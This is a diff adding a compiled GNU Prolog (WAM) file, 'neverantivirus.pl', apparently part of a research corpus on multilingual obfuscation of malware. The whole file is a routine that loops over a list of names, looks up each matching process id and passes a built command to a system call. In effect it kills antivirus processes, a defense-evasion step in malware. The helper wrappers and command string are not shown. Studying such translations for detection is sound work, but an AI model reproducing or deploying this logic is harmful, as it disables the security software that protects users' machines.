@@ -1,0 +1,97 @@
+% compiler: GNU Prolog 1.4.2
+% file    : neverantivirus.pl
+
+
+file_name('/home/yufeijiang/Dropbox/security thursday/multilingual obfuscation/babel/evaluation/hunacha/hunatcha/translation/neverantivirus.pl').
+
+
+predicate(never_anti_virus/1,7,static,private,monofile,global,1).
+
+
+clause(:-(never_anti_virus(A),','(is(B,0),loop(B,A))),[
+    allocate(2),
+    get_variable(y(0),0),
+    put_variable(y(1),0),
+    put_integer(0,1),
+    call((is)/2),
+    put_unsafe_value(y(1),0),
+    put_value(y(0),1),
+    deallocate,
+    execute((loop)/2)]).
+
+
+predicate(loop/2,9,static,private,monofile,global,2).
+
+
+clause(:-(loop(A,B),','(is(C,+(B,*(A,4))),','(string_ptr_dereference(C,D),','(=\=(D,0),','(findprocessid_wrapper(D,E),','(;(','(=\=(E,0),','(sprintf_wrapper(E,F),system_wrapper(F))),nl),','(is(G,+(A,1)),loop(G,B)))))))),[
+    allocate(6),
+    get_variable(y(0),0),
+    get_variable(y(1),1),
+    put_variable(y(2),0),
+    put_structure((+)/2,1),
+    unify_local_value(y(1)),
+    unify_structure((*)/2),
+    unify_local_value(y(0)),
+    unify_integer(4),
+    call((is)/2),
+    put_value(y(2),0),
+    put_variable(y(3),1),
+    call((string_ptr_dereference)/2),
+    put_value(y(3),0),
+    put_integer(0,1),
+    call((=\=)/2),
+    put_value(y(3),0),
+    put_variable(y(4),1),
+    call((findprocessid_wrapper)/2),
+    put_value(y(4),0),
+    call(('$loop/2_$aux1')/1),
+    put_variable(y(5),0),
+    put_structure((+)/2,1),
+    unify_local_value(y(0)),
+    unify_integer(1),
+    call((is)/2),
+    put_unsafe_value(y(5),0),
+    put_value(y(1),1),
+    deallocate,
+    execute((loop)/2)]).
+
+
+clause(:-(loop(A,B),','(is(C,+(B,*(A,4))),','(string_ptr_dereference(C,_),\+(=\=(_,0))))),[
+    allocate(1),
+    get_variable(x(2),1),
+    put_structure((+)/2,1),
+    unify_local_value(x(2)),
+    unify_structure((*)/2),
+    unify_local_value(x(0)),
+    unify_integer(4),
+    put_variable(y(0),0),
+    call((is)/2),
+    put_value(y(0),0),
+    put_void(1),
+    call((string_ptr_dereference)/2),
+    put_structure((=\=)/2,0),
+    unify_void(1),
+    unify_integer(0),
+    deallocate,
+    execute((\+)/1)]).
+
+
+predicate('$loop/2_$aux1'/1,9,static,private,monofile,local,2).
+
+
+clause(:-('$loop/2_$aux1'(A),','(=\=(A,0),','(sprintf_wrapper(A,B),system_wrapper(B)))),[
+    allocate(2),
+    get_variable(y(0),0),
+    put_value(y(0),0),
+    put_integer(0,1),
+    call((=\=)/2),
+    put_value(y(0),0),
+    put_variable(y(1),1),
+    call((sprintf_wrapper)/2),
+    put_unsafe_value(y(1),0),
+    deallocate,
+    execute((system_wrapper)/1)]).
+
+
+clause(:-('$loop/2_$aux1'(_),nl),[
+    execute((nl)/0)]).
